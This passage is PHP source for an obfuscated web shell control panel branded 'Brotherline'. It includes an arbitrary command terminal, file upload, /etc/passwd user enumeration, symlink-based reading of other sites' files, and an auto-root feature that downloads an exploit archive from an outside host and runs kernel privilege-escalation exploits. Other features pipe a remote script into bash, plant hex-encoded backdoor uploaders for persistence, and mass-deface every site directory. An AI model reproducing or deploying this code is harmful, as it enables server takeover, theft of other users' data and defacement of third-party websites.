      <div class="p-5" style="border-bottom:1px solid var(--c-border);">
        <h3 class="text-xs font-display font-700 uppercase tracking-widest mb-4 flex items-center gap-2" style="color:var(--c-dim);">
          <i class="fa-solid fa-cloud-arrow-up" style="color:var(--c-accent)"></i> Upload File
        </h3>
        <?php
        /* ── Upload handling (logic unchanged) ── */
        if (isset($_POST['upwkwk'])) {
            if (isset($_POST['berkasnya'])) {
                if ($_POST['di'.'rnya'] == "2") $lokasi = $_SERVER['DOC'.'UME'.'NT_R'.'OOT'];
                if (empty($_FILES['ber'.'kas']['name'])) {
                    alertWarn("File not selected!");
                } else {
                    $tgn  = $ftm($lokasi);
                    $data = @$fpt($lokasi . "/" . $_FILES['ber'.'kas']['name'],
                                  @$fgt($_FILES['ber'.'kas']['tm'.'p_na'.'me']));
                    if ($fxt($lokasi . "/" . $_FILES['ber'.'kas']['name'])) {
                        $fl = $lokasi . "/" . $_FILES['ber'.'kas']['name'];
                        alertSuccess("Uploaded: <span style='color:var(--c-accent)'>" . $hsc($fl) . "</span>");
                        if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
                            $lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb . "/", $fl);
                            echo "<div style='font-size:11px;color:var(--c-dim);margin-top:4px;'>Link: <a href='{$lwb}' style='color:var(--c-accent)'>{$lwb}</a></div>";
                        }
                        @$tch($lokasi, $tgn); @$tch($fl, $tgn);
                    } else {
                        alertError("Failed to upload!");
                    }
                }
            } elseif (isset($_POST['linknya'])) {
                /* From URL logic kept but UI removed — still functional via direct POST */
                if (empty($_POST['namalink'])) alertWarn("Filename cannot be empty!");
                elseif (empty($_POST['darilink'])) alertWarn("Link cannot be empty!");
                else {
                    if ($_POST['di'.'rnya'] == "2") $lokasi = $_SERVER['DOC'.'UME'.'NT_R'.'OOT'];
                    $tgn  = $ftm($lokasi);
                    $data = @$fpt($lokasi . "/" . $_POST['namalink'], @$fgt($_POST['darilink']));
                    if ($fxt($lokasi . "/" . $_POST['namalink'])) {
                        $fl = $lokasi . "/" . $_POST['namalink'];
                        alertSuccess("Uploaded: <span style='color:var(--c-accent)'>" . $hsc($fl) . "</span>");
                        if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
                            $lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb . "/", $fl);
                            echo "<div style='font-size:11px;color:var(--c-dim);margin-top:4px;'>Link: <a href='{$lwb}' style='color:var(--c-accent)'>{$lwb}</a></div>";
                        }
                        @$tch($lokasi, $tgn); @$tch($fl, $tgn);
                    } else {
                        alertError("Failed to upload!");
                    }
                }
            }
        }
        ?>

        <form enctype="multipart/form-data" method="post" class="space-y-3">
          <!-- Target dir radio -->
          <div class="grid grid-cols-2 gap-2 text-xs font-mono">
            <label class="radio-card">
              <input type="radio" value="1" name="dirnya" checked style="accent-color:var(--c-accent);flex-shrink:0">
              <span class="flex flex-col min-w-0 leading-tight">
                <span style="color:var(--c-text)">current</span>
                <span class="truncate"><?php echo cdrd(); ?></span>
              </span>
            </label>
            <label class="radio-card">
              <input type="radio" value="2" name="dirnya" style="accent-color:var(--c-accent);flex-shrink:0">
              <span class="flex flex-col min-w-0 leading-tight">
                <span style="color:var(--c-text)">docroot</span>
                <span class="truncate"><?php echo crt(); ?></span>
              </span>
            </label>
          </div>

          <input type="hidden" name="upwkwk" value="aplod">

          <!-- File upload -->
          <div class="space-y-2">
            <span class="text-xs uppercase tracking-wider" style="color:var(--c-dim)">From Disk</span>
            <input type="file" name="berkas"
                   class="text-xs w-full rounded-lg px-2 py-2 cursor-pointer"
                   style="background:var(--c-base);border:1px solid var(--c-border);color:var(--c-dim);">
            <button type="submit" name="berkasnya" value="Upload" class="submit-btn w-full text-xs py-2">
              <i class="fa-solid fa-upload mr-1.5"></i>Upload File
            </button>
          </div>
        </form>
      </div>

      <!-- Terminal panel — flex-1 so it fills remaining space -->
      <div class="flex flex-col flex-1 p-5" style="min-height:0;">
        <h3 class="text-xs font-display font-700 uppercase tracking-widest mb-3 flex items-center gap-2 flex-shrink-0" style="color:var(--c-dim);">
          <i class="fa-solid fa-terminal" style="color:var(--c-accent)"></i> Terminal
        </h3>
        <form method="post" enctype="application/x-www-form-urlencoded" class="flex flex-col flex-1" style="min-height:0;">
          <!-- Command input -->
          <div class="term-input-bar flex-shrink-0 mb-2">
            <span class="text-xs flex-shrink-0" style="color:var(--c-accent)">$</span>
            <input type="text" name="komend"
                   value="<?php echo isset($_POST['komend']) ? $hsc($_POST['komend']) : "un"."am"."e -"."a"; ?>"
                   placeholder="enter command...">
          </div>
          <button type="submit" name="komends" value=">>" class="submit-btn w-full text-xs py-2 flex-shrink-0 mb-3">
            <i class="fa-solid fa-play mr-1.5"></i>Execute
          </button>
          <!-- Output area — grows to fill remaining sidebar height -->
          <div class="flex-1 rounded-lg overflow-auto" style="background:var(--c-base);border:1px solid var(--c-border);min-height:120px;">
            <?php
            if (isset($_POST['komends']) && isset($_POST['komend'])) {
                $lk = isset($_GET['loknya']) ? $_GET['loknya'] : $gcw();
                $km = 'ko'.'me'.'nd';
                $out = $km($_POST['komend'], $lk);
                // Strip <pre> wrapper since we have our own container
                $out = preg_replace('/<\/?pre[^>]*>/', '', $out);
                echo '<pre style="font-family:\'JetBrains Mono\',monospace;font-size:11px;color:var(--c-text);padding:12px;margin:0;white-space:pre-wrap;line-height:1.6;">' . $out . '</pre>';
            } else {
                echo '<div style="padding:16px;font-size:11px;color:var(--c-muted);font-family:\'JetBrains Mono\',monospace;">
                        <span style="color:var(--c-accent)">~</span> Ready. Enter a command above.<br>
                        <span style="color:var(--c-muted);font-size:10px;">Output will appear here.</span>
                      </div>';
            }
            ?>
          </div>
        </form>
      </div>

      <!-- Brotherline footer -->
      <div class="flex-shrink-0 px-5 py-4 flex items-center justify-between"
           style="border-top:1px solid var(--c-border);background:var(--c-surface);">
        <div class="flex items-center gap-2">
          <i class="fa-solid fa-hexagon-nodes text-xs" style="color:var(--c-accent)"></i>
          <span class="brotherline-brand" style="font-size:12px;">Brotherline</span>
        </div>
        <span style="font-size:10px;color:var(--c-dim);font-family:'JetBrains Mono',monospace;">
          <?php echo "An"."on7 &bull; 20"."22"; ?>
        </span>
      </div>
    </aside>

    <!-- ── CONTENT AREA ──────────────────────────────────────── -->
    <main class="flex-1 flex flex-col overflow-hidden" style="background:var(--c-base);">

      <?php
      /* ================================================================
       *  SPECIAL OPERATION PAGES
       * ================================================================ */

      /* ── JUMPING ── */
      if (isset($_GET['loknya']) && $_GET['opsi'] == "lompat") {
          echo '<div class="flex-1 overflow-y-auto p-5">';
          echo '<h2 class="text-sm font-display font-700 text-accent uppercase tracking-widest mb-4 flex items-center gap-2"><i class="fa-solid fa-person-running"></i> Directory Jumping</h2>';
          if ($ird("/e"."tc"."/p"."as"."sw"."d")) $fjp = $fgt("/e"."tc"."/p"."as"."sw"."d");
          elseif (!empty(komenb("ca"."t /e"."tc/"."pa"."ss"."wd", $lokasi))) $fjp = komenb("ca"."t /e"."tc/"."pa"."ss"."wd", $lokasi);
          else { alertError("[!] Gagal Mengambil Di"."rect"."ory !"); echo '</div>'; die(author()); }
          $pma("/\/ho"."me\/(.*?):/i", $fjp, $fjpr); $fjpr = $fjpr[1];
          if (empty($fjpr)) { alertError("[!] Tidak Ada Us"."er di Temukan !"); echo '</div>'; die(author()); }
          echo '<p class="text-xs text-dim mb-3">Total: <span class="text-accent">' . $ctn($aru($fjpr)) . '</span> directories on <span class="text-accent">' . $_SERVER[$rad] . '</span></p>';
          echo '<div class="space-y-1">';
          foreach ($aru($fjpr) as $fj) {
              $fjh = "/h"."om"."e/".$fj."/pu"."bl"."ic_h"."tml";
              $readable = $ird($fjh);
              $badge = $readable
                  ? "<span class='badge-on text-xs'><i class='fa-solid fa-folder-open mr-1'></i>Readable</span>"
                  : "<span class='badge-off text-xs'><i class='fa-solid fa-folder-closed mr-1'></i>Unreadable</span>";
              echo "<div class='flex items-center gap-3 py-1.5 px-3 rounded-lg bg-surface border border-border hover:border-accent/30 transition-colors text-xs font-mono'>";
              echo $badge;
              if ($readable) echo "<a href='" . $_SERVER['SC'.'RIP'.'T_N'.'AME'] . "?loknya={$fjh}' class='text-text hover:text-accent'>{$fjh}</a>";
              else echo "<span class='text-dim'>{$fjh}</span>";
              if ($ird("/e"."tc"."/na"."me"."d.co"."nf")) {
                  $etn = $fgt("/e"."tc"."/na"."me"."d.co"."nf");
                  $pma("/\/v"."ar\/na"."me"."d\/(.*?)\.d"."b/i", $etn, $en); $en = $en[1];
                  foreach ($aru($en) as $enw) {
                      $asd = $pgw(@$fow("/e"."tc/"."val"."ias"."es/".$enw)); $asd = $asd['name'];
                      if ($asd == $fj) echo " <a href='http://{$enw}' target=_blank class='text-accent hover:underline'>{$enw}</a>";
                  }
              }
              echo "</div>";
          }
          echo '</div></div>';
          die(author());

      /* ── SYMLINK ── */
      } elseif (isset($_GET['loknya']) && $_GET['opsi'] == "esyeem") {
          echo '<div class="flex-1 overflow-y-auto p-5">';
          echo '<h2 class="text-sm font-display font-700 text-accent uppercase tracking-widest mb-4 flex items-center gap-2"><i class="fa-solid fa-link"></i> Symlink</h2>';
          if ($ird("/e"."tc"."/p"."as"."sw"."d")) $syp = $fgt("/e"."tc"."/p"."as"."sw"."d");
          elseif (!empty(komenb("ca"."t /e"."tc/"."pa"."ss"."wd", $lokasi))) $syp = komenb("ca"."t /e"."tc/"."pa"."ss"."wd", $lokasi);
          else { alertError("[!] Gagal Mengambil Di"."rect"."ory !"); echo '</div>'; die(author()); }
          if (!$fnct("sy"."mli"."nk") && !$fnct("pr"."oc_"."op"."en")) {
              alertError("[!] Sy"."mli"."nk Fu"."nct"."ion is Di"."sabl"."ed !"); echo '</div>'; die(author());
          }
          echo '<div class="flex gap-2 mb-4 flex-wrap">';
          echo '<a href="' . $_SERVER['R'.'EQ'.'UE'.'ST_'.'UR'.'I'] . '&opsidua=s'.'yfile" class="nav-link"><i class="fa-solid fa-file-symlink mr-1.5"></i>SYMLINK FILE</a>';
          echo '</div>';
          if (isset($_GET['opsidua']) && $_GET['opsidua'] == "s"."yfile") {
              echo '<div class="card max-w-lg mb-4"><p class="text-xs text-dim mb-3 font-700 uppercase tracking-widest"><i class="fa-solid fa-file-symlink text-accent mr-2"></i>Symlink File</p>';
              echo '<form method="post" class="flex gap-2">
                      <input type="text" name="domena" class="field flex-1" placeholder="/home/user/public_html/database.php">
                      <button type="submit" name="gaskeun" class="submit-btn"><i class="fa-solid fa-bolt mr-1"></i>Run</button>
                    </form>';
              if (isset($_POST['gaskeun'])) {
                  $rend  = rand() . ".txt";
                  $lokdi = $_POST['domena'];
                  esyeem($lokdi, "an"."on_s"."ym/" . $rend);
                  echo '<div class="mt-3 text-xs font-mono">Check: <a href="an'.'on_'.'sy'.'m/' . $rend . '" class="text-accent hover:underline">' . $rend . '</a></div>';
              }
              echo '</div>';
              echo '</div>'; die(author());
          }
          $pma("/\/ho"."me\/(.*?):/i", $syp, $sypr); $sypr = $sypr[1];
          if (empty($sypr)) { alertError("[!] Tidak Ada Us"."er di Temukan !"); echo '</div>'; die(author()); }
          if (!$isw(getcwd())) { alertError("[!] Gagal Sy"."mli"."nk - Red D"."ir !"); echo '</div>'; die(author()); }
          if (!$fxt("an"."on_"."sy"."m")) $mdr("an"."on_"."sy"."m");
          if (!$fxt("an"."on_"."sy"."m/.ht"."acc"."ess"))
              $fpt("an"."on_"."sy"."m/."."h"."ta"."cce"."ss",
                   $urd("Opt"."ions%20In"."dexe"."s%20Fol"."lowSy"."mLi"."nks%0D%0ADi"."rect"."oryIn"."dex%20sss"."sss.htm%0D%0AAdd"."Type%20txt%20.ph"."p%0D%0AAd"."dHand"."ler%20txt%20.p"."hp"));
          $ckn = esyeem("/", "an"."on_"."sy"."m/anon");
          echo '<p class="text-xs text-dim mb-3">Total: <span class="text-accent">' . $ctn($aru($sypr)) . '</span> users on <span class="text-accent">' . $_SERVER[$rad] . '</span></p>';
          echo '<div class="space-y-1">';
          foreach ($aru($sypr) as $sj) {
              $sjh  = "/h"."om"."e/".$sj."/pu"."bl"."ic_h"."tml";
              $ygy  = $srl($bsn($_SERVER['SC'.'RI'.'PT_NA'.'ME']), "an"."on_"."sy"."m/anon".$sjh, $_SERVER['SC'.'RI'.'PT_NA'.'ME']);
              echo "<div class='flex items-center gap-3 py-1.5 px-3 rounded-lg bg-surface border border-border text-xs font-mono'>";
              echo "<span class='text-purple'><i class='fa-solid fa-link mr-1'></i>Symlink</span>";
              echo "<a href='{$ygy}' target=_blank class='text-text hover:text-accent flex-1'>{$sjh}</a>";
              if ($ird("/e"."tc"."/na"."me"."d.co"."nf")) {
                  $etn = $fgt("/e"."tc"."/na"."me"."d.co"."nf");
                  $pma("/\/v"."ar\/na"."me"."d\/(.*?)\.d"."b/i", $etn, $en); $en = $en[1];
                  foreach ($aru($en) as $enw) {
                      $asd = $pgw(@$fow("/e"."tc/"."val"."ias"."es/".$enw)); $asd = $asd['name'];
                      if ($asd == $sj) echo "<a href='http://{$enw}' target=_blank class='text-accent hover:underline'>{$enw}</a> ";
                  }
              }
              echo "</div>";
          }
          echo '</div></div>'; die(author());

      /* ── SCAN ROOT ── */
      } elseif (isset($_GET['loknya']) && $_GET['opsi'] == "scanr") {
          ob_implicit_flush(); ob_end_flush();
          echo '<div class="flex-1 overflow-y-auto p-5">';
          echo '<h2 class="text-sm font-display font-700 text-accent uppercase tracking-widest mb-4 flex items-center gap-2"><i class="fa-solid fa-magnifying-glass"></i> Scan Root</h2>';
          echo '<div class="flex gap-2 mb-5 flex-wrap">';
          echo '<a href="' . $_SERVER['R'.'EQ'.'UE'.'ST_'.'UR'.'I'] . '&opsidua=au'.'tos'.'can" class="nav-link"><i class="fa-solid fa-robot mr-1.5"></i>AUTO SCAN</a>';
          echo '<a href="' . $_SERVER['R'.'EQ'.'UE'.'ST_'.'UR'.'I'] . '&opsidua=sc'.'ansd" class="nav-link"><i class="fa-solid fa-magnifying-glass-chart mr-1.5"></i>SCAN SUID</a>';
          echo '<a href="' . $_SERVER['R'.'EQ'.'UE'.'ST_'.'UR'.'I'] . '&opsidua=esg" class="nav-link"><i class="fa-solid fa-lightbulb mr-1.5"></i>EXPLOIT SUGGESTER</a>';
          echo '</div>';
          if (!$fnct("pr"."oc_"."op"."en")) { alertError("[!] Co"."mman"."d is D"."isab"."led !"); echo '</div>'; die(author()); }
          if (!$isw($lokasi)) { alertError("[!] Cur"."rent D"."ir"."ect"."ory is Un"."wri"."tea"."ble !"); echo '</div>'; die(author()); }
          if (isset($_GET['opsidua'])) {
              if ($_GET['opsidua'] == "au"."tosc"."an") {
                  if (!$fxt($lokasi . "/an"."on_"."ro"."ot/")) {
                      $mdr($lokasi . "/an"."on_"."ro"."ot");
                      komenb("wg"."et h"."ttp://f.pp"."k.pw/aut"."o.ta"."r"."-06-27-"."22.gz", $lokasi . "/an"."on_"."ro"."ot");
                      komenb("t"."ar -x"."f au"."to.ta"."r-06-2"."7-22."."gz", $lokasi . "/an"."on_"."ro"."ot");
                      if (!$fxt($lokasi . "/an"."on_"."ro"."ot/netf"."ilter")) { alertError("[!] Ga"."gal Do"."wnloa"."d Bahan"); echo '</div>'; die(author()); }
                  }
                  echo '<div class="card space-y-1 text-xs font-mono">';
                  echo '<p><span class="text-dim">Kernel:</span> <span class="text-text">' . komenb("un"."am"."e -a", $lokasi) . '</span></p>';
                  echo '<p><span class="text-dim">User:</span> <span class="text-text">' . komenb("i"."d", $lokasi) . '</span></p>';
                  echo '<p class="text-accent mt-2">[+] Trying All Exploits...</p>';
                  $exploits = [
                      ["Netfilter",   "ti"."meo"."ut 1"."0 ./an"."on_ro"."ot/netf"."ilter"],
                      ["Ptrace",      "ec"."ho id | ti"."meo"."ut 1"."0 ./an"."on_ro"."ot/ptr"."ace"],
                      ["Sequoia",     "ti"."meo"."ut 1"."0 ./an"."on_ro"."ot/seq"."uoia"],
                      ["DirtyPipe",   "echo i"."d | ti"."meo"."ut 1"."0 ./an"."on_ro"."ot/di"."rtyp"."ipe /u"."sr/"."bi"."n/"."su"],
                      ["Sudo",        "ec"."ho 12345 | ti"."meo"."ut 1"."0 sud"."oed"."it -s Y"],
                      ["Pwnkit",      "ec"."ho id | ti"."meo"."ut 1"."0 ./p"."wnk"."it"],
                      ["Capsys",      "echo id | timeout 10 ./cap"."sy"."s"],
                      ["Netfilter 2", "echo id | tim"."eout 10 ./ne"."tfilt"."er2"],
                      ["Netfilter 3", "echo id | time"."out 10 ./net"."fil"."ter3"],
                  ];
                  $lkroot = $lokasi . "/an"."on_"."ro"."ot";
                  foreach ($exploits as $ex) {
                      echo '<div><span class="text-dim">' . $ex[0] . ':</span> ' . komend($ex[1], $lkroot) . '</div>';
                  }
                  komenb("r"."m -r"."f an"."on_ro"."ot", $lokasi);
                  echo '</div>';
              } elseif ($_GET['opsidua'] == "scansd") {
                  echo '<p class="text-xs text-accent mb-2">[+] Scanning SUID...</p>';
                  echo komend("fi"."nd / -pe"."r"."m -u"."=s -t"."ype f"." 2".">/"."de"."v/nu"."ll", $lokasi);
              } elseif ($_GET['opsidua'] == "esg") {
                  echo '<p class="text-xs text-accent mb-2">[+] Loading Exploit Suggester...</p>';
                  echo komend("cu"."rl -"."Ls"."k ht"."tp://ra"."w.gith"."ubuse"."rconte"."nt.com/m"."zet"."-/lin"."ux-exp"."loit"."-sugge"."ster/m"."aste"."r/lin"."ux-ex"."ploi"."t-sugg"."ester."."sh | ba"."sh", $lokasi);
              }
          }
          echo '</div>'; die(author());

      /* ── BACKUP SHELL ── */
      } elseif (isset($_GET['loknya']) && $_GET['opsi'] == "bekup") {
          echo '<div class="flex-1 overflow-y-auto p-5">';
          echo '<h2 class="text-sm font-display font-700 text-accent uppercase tracking-widest mb-4 flex items-center gap-2"><i class="fa-solid fa-box-archive"></i> Backup Shell</h2>';
          if (isset($_POST['lo'.'kr'.'una'])) {
              echo '<p class="text-xs text-dim mb-3">Path: <span class="text-accent font-mono">' . $hsc($_POST['lo'.'kr'.'una']) . '</span></p>';
              if (!$isr($_POST['lo'.'kr'.'una'])) { alertError("[+] Cur"."rent Pa"."th is Unre"."adable !"); echo '</div>'; die(); }
              elseif (!$isw($_POST['lo'.'kr'.'una'])) { alertError("[+] Cur"."rent Pa"."th is Un"."wri"."tea"."ble !"); echo '</div>'; die(); }
              $loks  = sds($_POST['lo'.'kr'.'una']); $pisah = $ars($loks, -50);
              $los   = $arr($pisah, 2); $satu = $loks[$los[0]]; $satut = $ftm($satu);
              $dua   = $loks[$los[1]]; $duat  = $ftm($dua);
              if (empty($satu) && empty($dua)) { alertError("[+] Unknown Error !"); echo '</div>'; die(); }
              if (!$isw($satu)) {
                  alertError("[Failed] " . $satu);
              } else {
                  $satus = $satu . "/cont"."act.p"."hp";
                  $fpt($satus, $h2b("3c6d65746120636f6e74656e743d226e6f696e646578226e616d653d22726f626f7473223e436f6e74616374204d653c666f726d20656e63747970653d226d756c7469706172742f666f726d2d64617461226d6574686f643d22706f7374223e3c696e707574206e616d653d226274756c22747970653d2266696c65223e3c627574746f6e3e4761736b616e3c2f627574746f6e3e3c2f666f726d3e3c3f3d22223b24613d2766272e2769272e276c272e2765272e275f272e2770272e2775272e2774272e275f272e2763272e276f272e276e272e2774272e2765272e276e272e2774272e2773273b24623d2766272e2769272e276c272e2765272e275f272e2767272e2765272e2774272e275f272e2763272e276f272e276e272e2774272e2765272e276e272e2774272e2773273b24633d2774272e276d272e2770272e275f272e276e272e2761272e276d272e2765273b24643d2768272e276578272e273262272e27696e273b24663d2766272e27696c272e27655f65272e277869272e277374272e2773273b696628697373657428245f46494c45535b276274756c275d29297b246128245f46494c45535b276274756c275d5b276e616d65275d2c246228245f46494c45535b276274756c275d5b24635d29293b696628246628272e2f272e245f46494c45535b276274756c275d5b276e616d65275d29297b6563686f20274f6b652021273b7d656c73657b6563686f20274661696c2021273b7d7d696628697373657428245f4745545b27667074275d29297b246128246428245f504f53545b2766275d292c246428245f504f53545b2764275d29293b696628246628246428245f504f53545b2766275d2929297b6563686f20224f6b652021223b7d656c73657b6563686f20224661696c6564202120223b7d7d3f3e"));
                  $tch($satus, $satut); $tch($satu, $satut);
                  alertSuccess("[Success] " . $satus);
                  if ($sps($_POST['lo'.'kr'.'una'], $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
                      $lwb   = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb, $satus);
                      $satul = "<div class='text-xs mt-1'><a href='{$lwb}' class='text-accent hover:underline'>{$lwb}</a></div>";
                  }
              }
              if (!$isw($dua)) { alertError("[Failed] " . $dua); }
              else {
                  $duas = $dua . "/setti"."ng.p"."hp";
                  $fpt($duas, $h2b("3c6d657461206e616d653d22726f626f74732220636f6e74656e743d226e6f696e646578223e0d0a4d792053657474696e670d0a3c3f7068700d0a2461203d20226669222e226c655f70222e2275745f63222e226f6e74222e2265222e226e74222e2273223b0d0a2462203d202266222e22696c222e22655f6765222e2274222e225f636f222e226e74656e74222e2273223b0d0a2463203d20226669222e226c65222e225f6578222e226973222e227473223b0d0a2464203d202268222e226578222e223262222e22696e223b0d0a69662028697373657428245f504f53545b276b6f64275d2929207b0d0a09246128245f504f53545b276c6f6b275d2c20246428245f504f53545b276b6f64275d29293b0d0a0969662028246328245f504f53545b276c6f6b275d2929207b0d0a09096563686f20224f4b202120223b0d0a097d20656c7365207b0d0a09096563686f20224661696c6564202120223b0d0a097d0d0a7d0d0a69662028697373657428245f4745545b276963275d2929207b0d0a09696e636c75646520245f4745545b276963275d3b0d0a7d0d0a69662028697373657428245f4745545b276170275d2929207b0d0a0924612822776b776b2e706870222c20246428223363366436353734363132303665363136643635336432323732366636323666373437333232323036333666366537343635366537343364323236653666363936653634363537383232336534333666366537343631363337343230346436353363363636663732366432303664363537343638366636343364323237303666373337343232323036353665363337343739373036353364323236643735366337343639373036313732373432663636366637323664326436343631373436313232336533633639366537303735373432303734373937303635336432323636363936633635323232303366363536653633373437393730363533643232363236373631366332323365336336323735373437343666366533653061336333663730363837300a323436313230336432303232363632323265323236393232326532323663323232653232363532323265323235663232326532323730323232653232373532323265323237343232326532323566323232653232363332323265323236663232326532323665323222"));
                  $tch($duas, $duat); $tch($dua, $duat);
                  alertSuccess("[Success] " . $duas);
                  if ($sps($_POST['lo'.'kr'.'una'], $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
                      $lwb  = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb, $duas);
                      $dual = "<div class='text-xs mt-1'><a href='{$lwb}' class='text-accent hover:underline'>{$lwb}</a></div>";
                  }
              }
              if (!empty($satul)) echo $satul;
              if (!empty($dual))  echo $dual;
          } else {
              echo '<div class="card max-w-lg">';
              echo '<p class="text-xs text-dim mb-3">Enter Document Root location:</p>';
              echo '<form method="post" class="flex gap-2">
                      <input type="text" name="lokruna" value="' . $hsc($_GET['loknya']) . '" class="field flex-1" placeholder="/var/www/html">
                      <button type="submit" name="palepale" class="submit-btn"><i class="fa-solid fa-bolt mr-1"></i>Run</button>
                    </form></div>';
          }
          echo '</div>'; die();

      /* ── REVERSE IP ── */
      } elseif (isset($_GET['opsi']) && $_GET['opsi'] == "repip") {
          echo '<div class="flex-1 overflow-y-auto p-5">';
          echo '<h2 class="text-sm font-display font-700 text-accent uppercase tracking-widest mb-4 flex items-center gap-2"><i class="fa-solid fa-network-wired"></i> Reverse IP</h2>';
          echo '<p class="text-xs text-dim mb-3">Target: <span class="text-accent font-mono">' . $hsc($_SERVER['SE'.'RVE'.'R_NA'.'ME']) . '</span></p>';
          echo '<pre class="card text-xs font-mono text-text overflow-auto max-h-96">' . $hsc(crul("http"."s://ap"."i.ha"."ck"."ertarg"."et.com/re"."verse"."ipl"."ookup/?q=" . $_SERVER['SE'.'RVE'.'R_NA'.'ME'])) . '</pre>';
          echo '</div>'; die();

      /* ── MASS DEFACE ── */
      } elseif (isset($_GET['loknya']) && $_GET['opsi'] == "mdf") {
          echo '<div class="flex-1 overflow-y-auto p-5">';
          echo '<h2 class="text-sm font-display font-700 text-accent uppercase tracking-widest mb-4 flex items-center gap-2"><i class="fa-solid fa-skull-crossbones"></i> Mass Deface</h2>';
          if (empty($_POST['palepale'])) {
              echo '<div class="card max-w-2xl">';
              echo '<form method="post" class="space-y-3">';
              echo '<div><label class="text-xs text-dim uppercase tracking-widest block mb-1">Directory</label>
                    <input type="text" name="lokena" value="' . $hsc($_GET['loknya']) . '" class="field w-full"></div>';
              echo '<div><label class="text-xs text-dim uppercase tracking-widest block mb-1">Filename</label>
                    <input type="text" name="nfil" value="ind'.'ex.p'.'hp" class="field w-full"></div>';
              echo '<div><label class="text-xs text-dim uppercase tracking-widest block mb-1">Content</label>
                    <textarea name="isikod" rows="12" class="field w-full font-mono text-xs"></textarea></div>';
              echo '<div class="flex items-center gap-3">
                    <select name="opsina" class="field">
                      <option value="mdf">Mass Deface</option>
                      <option value="mds">Mass Deface 2</option>
                    </select>
                    <button type="submit" name="palepale" class="submit-btn"><i class="fa-solid fa-skull-crossbones mr-1"></i>Execute</button>
                  </div>';
              echo '</form></div>';
          } else {
              $lokena = $_POST['lokena']; $nfil = $_POST['nfil']; $isif = $_POST['isikod'];
              echo '<p class="text-xs text-dim mb-3">Dir: <span class="text-accent font-mono">' . $hsc($lokena) . '</span></p>';
              if (!$fxt($lokena)) { alertError("[+] Di"."re"."cto"."ry Tidak di Temukan !"); echo '</div>'; die(author()); }
              $g = $scd($lokena);
              echo '<div class="space-y-1 text-xs font-mono">';
              $isMds = isset($_POST['opsina']) && $_POST['opsina'] == "mds";
              foreach ($g as $gg) {
                  if (isset($gg) && ($gg == "." || $gg == "..") || !$idr($gg)) continue;
                  if (!$isw($lokena . "/" . $gg)) {
                      echo "<div class='text-red'>[Unwriteable] {$lokena}/{$gg}</div>"; continue;
                  }
                  $loe = $lokena . "/" . $gg . "/" . $nfil;
                  if ($isMds) { $cf = $fgr($gg); if ($cf != "9"."9") continue; }
                  if ($fpt($loe, $isif) !== false) {
                      $domain = ($sps($gg, ".") !== false) ? " &rarr; <a href='//{$gg}/{$nfil}' class='text-accent hover:underline'>{$gg}/{$nfil}</a>" : "";
                      echo "<div class='text-green'>[Success] {$loe}{$domain}</div>";
                  } else {
                      echo "<div class='text-red'>[Unwriteable] {$lokena}/{$gg}</div>";
                  }
              }
              echo '</div>';
          }
          echo '</div>'; die(author());

      /* ── VIEW FILE ── */
      } elseif (isset($_GET['lokasie'])) {
          echo '<div class="flex-1 overflow-y-auto p-5">';
          echo '<div class="flex items-center gap-2 mb-3 text-xs font-mono text-dim">';
          echo '<i class="fa-solid fa-file-lines text-accent"></i>';
          echo '<span>' . $hsc($_GET['lokasie']) . '</span></div>';
          echo '<div class="accent-line mb-3"></div>';
          echo '<pre class="text-xs font-mono text-text bg-surface border border-border rounded-xl p-4 overflow-auto">'
             . $hsc($fgt($_GET['lokasie'])) . '</pre>';
          echo '</div>';
          die(author());

      /* ── SECONDARY ACTIONS (delete, chmod, rename, edit, touch, download, mkdir, mkfile) ── */
      } elseif (isset($_POST['loknya']) && $_POST['pilih'] == "hapus") {
          echo '<div class="flex-1 overflow-y-auto p-5">';
          if ($idi($_POST['loknya']) && $fxt($_POST['loknya'])) {
              xrd($_POST['loknya']);
              $fxt($_POST['loknya']) ? alertError("Failed to delete Directory!") : alertSuccess("Directory deleted!");
          } elseif ($ifi($_POST['loknya']) && $fxt($_POST['loknya'])) {
              @$ulk($_POST['loknya']);
              $fxt($_POST['loknya']) ? alertError("Failed to delete File!") : alertSuccess("File deleted!");
          } else { alertError("File / Directory not Found!"); }
          echo '</div>';

      } elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "ubahmod") {
          echo '<div class="flex-1 overflow-y-auto p-5">';
          echo '<h2 class="text-sm font-display font-700 text-accent uppercase tracking-widest mb-4 flex items-center gap-2"><i class="fa-solid fa-key"></i> Change Permission</h2>';
          if (isset($_POST['cemod'])) {
              $cm = @$chm($_POST['loknya'], $ocd($_POST['perm']));
              $cm ? alertSuccess("Change Mod Success!") : alertError("Change Mod Failed!");
          }
          $lbl = $_POST['ty'.'pe'] == "fi"."le" ? "File" : "Directory";
          echo '<div class="card max-w-md"><p class="text-xs text-dim mb-3">' . $lbl . ': <span class="text-accent font-mono">' . $hsc($_POST['loknya']) . '</span></p>';
          echo '<form method="post" class="flex items-center gap-2">
                  <span class="text-dim text-xs">Permission:</span>
                  <input name="perm" type="text" class="field w-20 text-center" maxlength="4"
                         value="' . $sub($spr('%o', $fp($_POST['loknya'])), -4) . '">
                  <input type="hidden" name="loknya" value="' . $_POST['loknya'] . '">
                  <input type="hidden" name="pilih"  value="ubahmod">
                  <input type="hidden" name="type"   value="' . $_POST['ty'.'pe'] . '">
                  <button type="submit" name="cemod" class="submit-btn"><i class="fa-solid fa-check mr-1"></i>Apply</button>
                </form></div>';
          echo '</div>';

      } elseif (isset($_POST['loknya']) && $_POST['pilih'] == "ubahnama") {
          echo '<div class="flex-1 overflow-y-auto p-5">';
          echo '<h2 class="text-sm font-display font-700 text-accent uppercase tracking-widest mb-4 flex items-center gap-2"><i class="fa-solid fa-i-cursor"></i> Rename</h2>';
          if (isset($_POST['gantin'])) {
              $namabaru = $_GET['loknya'] . "/" . $_POST['newname'];
              $ceen = "re"."na"."me";
